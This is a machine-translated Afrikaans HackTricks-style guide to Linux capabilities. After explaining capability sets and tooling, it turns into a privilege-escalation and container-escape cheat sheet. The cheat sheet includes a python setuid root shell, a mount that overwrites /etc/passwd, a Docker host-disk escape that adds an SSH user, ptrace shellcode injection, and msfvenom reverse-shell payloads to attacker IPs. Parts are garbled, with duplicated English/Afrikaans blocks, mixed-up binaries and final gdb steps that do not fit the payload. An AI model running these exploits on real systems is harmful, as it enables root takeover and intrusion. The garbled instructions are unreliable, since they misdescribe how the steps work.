# Linux-vermoëns

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) is die mees relevante kuberveiligheidsevenement in **Spanje** en een van die belangrikste in **Europa**. Met **die missie om tegniese kennis te bevorder**, is hierdie kongres 'n kookpunt vir tegnologie- en kuberveiligheidspesialiste in elke dissipline.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux-vermoëns

Linux-vermoëns verdeel **root-voorregte in kleiner, onderskeibare eenhede**, wat prosesse in staat stel om 'n subset van vermoëns te hê. Dit verminder die risiko deur nie onnodige volle root-voorregte toe te ken nie.

### Die Probleem:
- Normale gebruikers het beperkte toestemmings, wat take soos die oopmaak van 'n netwerksocket wat root-toegang vereis, beïnvloed.

### Vermoënskoppelvlakke:

1. **Geërf (CapInh)**:
- **Doel**: Bepaal die vermoëns wat van die ouerproses oorgedra word.
- **Funksionaliteit**: Wanneer 'n nuwe proses geskep word, erf dit die vermoëns van sy ouer in hierdie stel. Dit is nuttig om sekere voorregte oor prosesverwekings te handhaaf.
- **Beperkings**: 'n Proses kan nie vermoëns verkry wat sy ouer nie besit het nie.

2. **Effektief (CapEff)**:
- **Doel**: Verteenwoordig die werklike vermoëns wat 'n proses op enige oomblik gebruik.
- **Funksionaliteit**: Dit is die stel vermoëns wat deur die kern nagegaan word om toestemming vir verskeie operasies te verleen. Vir lêers kan hierdie stel 'n vlag wees wat aandui of die toegelate vermoëns van die lêer as effektief beskou moet word.
- **Betrokkenheid**: Die effektiewe stel is van kritieke belang vir onmiddellike voorregnagaan, en tree op as die aktiewe stel vermoëns wat 'n proses kan gebruik.

3. **Toegelaat (CapPrm)**:
- **Doel**: Definieer die maksimum stel vermoëns wat 'n proses kan besit.
- **Funksionaliteit**: 'n Proses kan 'n vermoë van die toegelate stel na sy effektiewe stel verhoog, wat hom die vermoë gee om daardie vermoë te gebruik. Dit kan ook vermoëns uit sy toegelate stel verwyder.
- **Grens**: Dit tree op as 'n boonste grens vir die vermoëns wat 'n proses kan hê, en verseker dat 'n proses nie sy voorafbepaalde voorregomvang oorskry nie.

4. **Begrens (CapBnd)**:
- **Doel**: Stel 'n plafon op die vermoëns wat 'n proses gedurende sy lewensiklus kan bekom.
- **Funksionaliteit**: Selfs as 'n proses 'n sekere vermoë in sy oorerfbare of toegelate stel het, kan dit nie daardie vermoë bekom tensy dit ook in die begrensingsstel is nie.
- **Gebruiksscenario**: Hierdie stel is veral nuttig om 'n proses se potensiaal vir voorregverhoging te beperk en 'n ekstra laag sekuriteit toe te voeg.

5. **Omringend (CapAmb)**:
- **Doel**: Maak dit moontlik dat sekere vermoëns behoue bly tydens 'n `execve`-sisteemaanroep, wat normaalweg sou lei tot 'n volledige herstel van die proses se vermoëns.
- **Funksionaliteit**: Verseker dat nie-SUID-programme wat nie geassosieerde lêervermoëns het nie, sekere voorregte kan behou.
- **Beperkings**: Vermoëns in hierdie stel is onderhewig aan die beperkings van die oorerfbare en toegelate stelle, om te verseker dat hulle nie die proses se toegelate voorregte oorskry nie.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Vir verdere inligting, kyk na:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Prosesse & Binêre Kapasiteite

### Prosesse Kapasiteite

Om die kapasiteite vir 'n spesifieke proses te sien, gebruik die **status** lêer in die /proc gids. Aangesien dit meer besonderhede verskaf, beperk ons dit slegs tot die inligting wat verband hou met Linux kapasiteite.\
Let daarop dat vir alle lopende prosesse kapasiteitinligting per draad onderhou word, en vir binêre lêers in die lêersisteem word dit in uitgebreide eienskappe gestoor.

Jy kan die kapasiteite wat in /usr/include/linux/capability.h gedefinieer is, vind.

Jy kan die kapasiteite van die huidige proses vind in `cat /proc/self/status` of deur `capsh --print` te doen, en van ander gebruikers in `/proc/<pid>/status`.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Hierdie bevel moet 5 lyne op die meeste stelsels teruggee.

* CapInh = Geërfde vermoëns
* CapPrm = Toegelate vermoëns
* CapEff = Effektiewe vermoëns
* CapBnd = Grensstellings
* CapAmb = Omgewingsvermoëns stel
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Hierdie heksadesimale getalle maak nie sin nie. Deur die capsh-hulpprogram te gebruik, kan ons hulle ontsleutel na die naam van die vermoëns.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Laten ons nou die **vermoëns** wat deur `ping` gebruik word, nagaan:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Alhoewel dit werk, is daar 'n ander en makliker manier. Om die vermoëns van 'n lopende proses te sien, gebruik eenvoudig die **getpcaps**-instrument gevolg deur sy proses-ID (PID). Jy kan ook 'n lys van proses-ID's voorsien.
```bash
getpcaps 1234
```
Laten ons hier die vermoëns van `tcpdump` nagaan nadat die binêre lêer genoeg vermoëns (`cap_net_admin` en `cap_net_raw`) gekry het om die netwerk te bespeur (_tcpdump word uitgevoer in proses 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Soos u kan sien, stem die gegee bevoegdhede ooreen met die resultate van die 2 maniere om die bevoegdhede van 'n binêre lêer te bekom. Die _getpcaps_ hulpmiddel gebruik die **capget()** stelseloproep om die beskikbare bevoegdhede vir 'n spesifieke draad te ondersoek. Hierdie stelseloproep hoef slegs die PID te voorsien om meer inligting te verkry.

### Binêre Bevoegdhede

Binêre lêers kan bevoegdhede hê wat tydens uitvoering gebruik kan word. Byvoorbeeld, dit is baie algemeen om die `ping` binêre lêer met die `cap_net_raw` bevoegdheid te vind:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Jy kan **binêre lêers met vermoëns soek** deur die volgende te gebruik:
```bash
getcap -r / 2>/dev/null
```
### Laat kapasiteite val met capsh

As ons die CAP\_NET\_RAW kapasiteite laat val vir _ping_, behoort die ping nut nie meer te werk nie.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Behalwe die uitset van _capsh_ self, moet die _tcpdump_ bevel self ook 'n fout veroorsaak.

> /bin/bash: /usr/sbin/tcpdump: Operasie nie toegelaat nie

Die fout wys duidelik dat die ping bevel nie toegelaat word om 'n ICMP sokket oop te maak nie. Nou weet ons verseker dat dit soos verwag werk.

### Verwyder Bekwaamhede

Jy kan bekwaamhede van 'n binêre lêer verwyder met
```bash
setcap -r </path/to/binary>
```
## Gebruikerseienaarskappe

Blykbaar is dit ook moontlik om eienaarskappe aan gebruikers toe te ken. Dit beteken waarskynlik dat elke proses wat deur die gebruiker uitgevoer word, die gebruikers se eienaarskappe kan gebruik.
Gebaseer op [hierdie](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [hierdie](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) en [hierdie](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) moet 'n paar nuwe lêers gekonfigureer word om 'n gebruiker sekere eienaarskappe te gee, maar die een wat die eienaarskappe aan elke gebruiker toeken, sal `/etc/security/capability.conf` wees.
Lêer voorbeeld:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Omgewingsvermoëns

Deur die volgende program te kompileer, is dit moontlik om **'n bash-skulp te skep binne 'n omgewing wat vermoëns bied**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Binne die **bash wat uitgevoer word deur die saamgestelde omgewingsbinêre**, is dit moontlik om die **nuwe vermoëns** waar te neem ( 'n gewone gebruiker sal geen vermoë in die "huidige" afdeling hê nie).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Jy kan **slegs vermoëns byvoeg wat teenwoordig is** in beide die toegelate en die oorerflike stelle.
{% endhint %}

### Vermoënsbewuste/vermoënsdomme bineêre lêers

Die **vermoënsbewuste bineêre lêers sal nie die nuwe vermoëns** wat deur die omgewing gegee word, gebruik nie, terwyl die **vermoënsdomme bineêre lêers** dit sal gebruik omdat hulle dit nie sal verwerp nie. Dit maak vermoënsdomme bineêre lêers kwesbaar binne 'n spesiale omgewing wat vermoëns aan bineêre lêers toeken.

## Diensvermoëns

Standaard sal 'n **diens wat as root uitgevoer word, alle vermoëns toegewys kry**, en in sommige gevalle kan dit gevaarlik wees.\
Daarom maak 'n **dienskonfigurasie**-lêer dit moontlik om die **vermoëns** wat jy wil hê dat dit moet hê, **en** die **gebruiker** wat die diens moet uitvoer, te **spesifiseer** om te voorkom dat 'n diens met onnodige bevoegdhede uitgevoer word:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Bevoegdhede in Docker-houers

Standaard ken Docker 'n paar bevoegdhede toe aan die houers. Dit is baie maklik om te kontroleer watter bevoegdhede dit is deur die volgende uit te voer:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) is die mees relevante sibersekuriteitsgebeurtenis in **Spanje** en een van die belangrikste in **Europa**. Met **die missie om tegniese kennis te bevorder**, is hierdie kongres 'n kookpunt vir tegnologie- en sibersekuriteitsprofessionals in elke dissipline.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Vermoëns is nuttig wanneer jy **jou eie prosesse wil beperk na die uitvoering van bevoorregte operasies** (bv. na die opstel van chroot en bind aan 'n sokket). Dit kan egter uitgebuit word deur kwaadwillige opdragte of argumente wat dan as root uitgevoer word.

Jy kan vermoëns afdwing op programme deur gebruik te maak van `setcap`, en dit ondersoek deur gebruik te maak van `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Die `+ep` beteken dat jy die vermoë byvoeg ("-" sal dit verwyder) as Effektief en Toegelaat.

Om programme in 'n stelsel of vouer met vermoëns te identifiseer:
```bash
getcap -r / 2>/dev/null
```
### Uitbuiting voorbeeld

In die volgende voorbeeld word gevind dat die binêre lêer `/usr/bin/python2.6` vatbaar is vir bevoorregte eskalasie:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Vermoëns** wat deur `tcpdump` benodig word om **enige gebruiker in staat te stel om pakkies te onderskep**:

```markdown
To allow any user to sniff packets, the `tcpdump` binary needs the following capabilities:

1. `CAP_NET_RAW`: This capability allows the binary to create raw sockets, which are necessary for packet sniffing.

To grant these capabilities to the `tcpdump` binary, you can use the `setcap` command as follows:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

After setting the capabilities, any user will be able to run `tcpdump` and sniff packets without requiring root privileges.
```
```afrikaans
Om enige gebruiker in staat te stel om pakkies te onderskep, benodig die `tcpdump` binêre lêer die volgende vermoëns:

1. `CAP_NET_RAW`: Hierdie vermoë stel die binêre lêer in staat om rou sokkels te skep, wat nodig is vir pakkie-onderskepping.

Om hierdie vermoëns aan die `tcpdump` binêre lêer toe te ken, kan jy die `setcap` opdrag soos volg gebruik:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

Nadat die vermoëns ingestel is, sal enige gebruiker in staat wees om `tcpdump` uit te voer en pakkies te onderskep sonder om root-voorregte te vereis.
```
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Die spesiale geval van "leë" vermoëns

[Van die dokumentasie](https://man7.org/linux/man-pages/man7/capabilities.7.html): Let daarop dat 'n mens leë vermoëstelle aan 'n programlêer kan toewys, en dit is dus moontlik om 'n stel-gebruiker-ID-root-program te skep wat die effektiewe en gestoorde gebruiker-ID van die proses wat die program uitvoer, na 0 verander, maar geen vermoëns aan daardie proses verleen nie. Of, eenvoudig gestel, as jy 'n binêre lêer het wat:

1. nie deur root besit word nie
2. geen `SUID`/`SGID`-bits ingestel het nie
3. leë vermoënsstel het (bv.: `getcap myelf` gee `myelf =ep` terug)

sal **daardie binêre lêer as root uitgevoer word**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is 'n hoogs kragtige Linux-vermoë, dikwels gelykgestel aan 'n bykans-rootvlak as gevolg van sy uitgebreide **administratiewe voorregte**, soos die koppel van toestelle of die manipulasie van kernelkenmerke. Terwyl dit onontbeerlik is vir houers wat hele stelsels simuleer, stel **`CAP_SYS_ADMIN` beduidende sekuriteitsuitdagings** in, veral in gehouerde omgewings, as gevolg van sy potensiaal vir voorregverhoging en stelselkompromie. Daarom vereis die gebruik daarvan streng sekuriteitsassesserings en versigtige bestuur, met 'n sterk voorkeur om hierdie vermoë in toepassingsspesifieke houers te laat val om aan die **beginsel van die minste voorreg** te voldoen en die aanvalsvlak te verminder.

**Voorbeeld met binêre lêer**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Met behulp van Python kan jy 'n gewysigde _passwd_ lêer bo-op die werklike _passwd_ lêer monteer:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
En uiteindelik **monteer** die gewysigde `passwd`-lêer op `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
En jy sal in staat wees om **`su` as root** te gebruik met die wagwoord "password".

**Voorbeeld met omgewing (Docker-ontsnapping)**

Jy kan die geaktiveerde vermoëns binne die Docker-houer nagaan deur die volgende te gebruik:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitset kan jy sien dat die SYS\_ADMIN-vermoë geaktiveer is.

* **Monteer**

Dit stel die docker-houer in staat om **die gasheer se skyf te monteer en vrylik daarop toegang te verkry**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Volledige toegang**

In die vorige metode het ons daarin geslaag om toegang tot die docker-gashouer se skyf te verkry.\
In die geval waar jy vind dat die gashouer 'n **ssh**-bediener hardloop, kan jy 'n gebruiker **binne die docker-gashouer se skyf skep** en toegang daartoe verkry via SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Dit beteken dat jy die houer kan ontsnap deur 'n shellcode in te spuit in 'n proses wat binne die gasheer loop.** Om toegang te verkry tot prosesse wat binne die gasheer loop, moet die houer ten minste met **`--pid=host`** uitgevoer word.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** verleen die vermoë om die foutopsporing en stelseloproep-trasseringfunksies wat deur `ptrace(2)` en kruis-geheue-aanhegtingsoproepe soos `process_vm_readv(2)` en `process_vm_writev(2)` verskaf word, te gebruik. Alhoewel dit kragtig is vir diagnostiese en moniteringsdoeleindes, kan dit as `CAP_SYS_PTRACE` geaktiveer is sonder beperkende maatreëls soos 'n seccomp-filter op `ptrace(2)`, die stelselsekuriteit aansienlik ondermyn. Dit kan spesifiek uitgebuit word om ander sekuriteitsbeperkings te omseil, veral dié wat deur seccomp opgelê word, soos gedemonstreer deur [bewys van konsepte (PoC) soos hierdie een](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Voorbeeld met binêre (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Voorbeeld met binêre (gdb)**

`gdb` met `ptrace` vermoë:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Skep 'n shellkode met msfvenom om in die geheue in te spuit deur middel van gdb

```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f raw -o shellcode
```

Hierdie opdrag sal 'n shellkode skep met behulp van msfvenom. Die shellkode sal 'n omgekeerde TCP-verbinding maak na die IP-adres 192.168.0.10 op poort 4444. Die `-f raw` vlag verseker dat die uitset in 'n roaw-formaat is, wat ons kan gebruik om dit in die geheue in te spuit. Die `-o shellcode` vlag stel die uitsetlêernaam in as "shellcode".
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Foutopsporing van 'n root-proses met gdb en kopieer en plak die voorheen gegenereerde gdb-lyne:

```bash
sudo gdb -p <pid>
```

Voer die volgende gdb-opdragte in:

```bash
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) catch exec
(gdb) run
```

Wag totdat die proses uitgevoer word en dan voer die volgende gdb-opdragte in:

```bash
(gdb) set follow-fork-mode parent
(gdb) set detach-on-fork on
(gdb) catch exec
(gdb) continue
```

